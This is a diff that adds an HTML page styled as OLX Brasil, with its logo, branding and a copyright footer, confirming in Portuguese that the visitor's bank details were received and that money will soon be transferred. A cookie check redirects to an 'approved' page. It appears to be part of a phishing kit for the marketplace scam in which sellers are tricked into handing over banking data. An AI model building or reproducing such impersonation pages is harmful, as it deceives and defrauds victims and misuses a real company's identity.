@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Confirmação - OLX">
+    <title>Confirmação - OLX Brasil</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="shortcut icon" href="/images/olx-favicon.ico" type="image/x-icon">
+     <script>
+        (function () {
+            if (document.cookie.indexOf("pagamentoFeito=true") !== -1) {
+                if (!window.location.pathname.endsWith('/pag/aprovado.html')) {
+                    window.location.href = '/pag/aprovado.html';
+                }
+            }
+        })();
+    </script>
+    <style>
+        .confirmacao-container {
+            text-align: center;
+            padding: 50px 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .confirmacao-icon {
+            font-size: 80px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+
+        .confirmacao-title {
+            font-size: 32px;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .confirmacao-message {
+            font-size: 18px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .btn-voltar {
+            background-color: #6e0ad6;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .btn-voltar:hover {
+            background-color: #5a08b0;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="app-container">
+        <header class="header">
+            <div class="header-content">
+                <div class="logo">
+                    <img src="/images/olx-logo.png" alt="Logo OLX">
+                </div>
+                <div class="header-actions">
+                    <button class="btn-ajuda">
+                        <i class="fas fa-question-circle"></i> Ajuda
+                    </button>
+                    <button class="btn-conta">
+                        <i class="fas fa-user-circle"></i> Minha Conta
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="confirmacao-container">
+                <i class="fas fa-check-circle confirmacao-icon"></i>
+                <h1 class="confirmacao-title">Dados Enviados com Sucesso!</h1>
+                <p class="confirmacao-message">
+                    Seus dados bancários foram recebidos e estão sendo processados.
+                    Em breve você receberá uma confirmação e o valor será transferido para sua conta.
+                </p>
+                <p class="confirmacao-message">
+                    Se tiver alguma dúvida, entre em contato com nossa Central de Atendimento.
+                </p>
+                <button class="btn-voltar" onclick="window.location.href='/'">Voltar para a OLX</button>
+            </div>
+        </main>
+
+        <footer>
+            <div class="footer-bottom">
+                <p>© 2023 OLX Brasil - Todos os direitos reservados</p>
+                <p>CNPJ: 13.673.743/0002-55 - Avenida Paulista, 1000 - São Paulo/SP</p>
+            </div>
+        </footer>
+    </div>
+</body>
+
+</html>
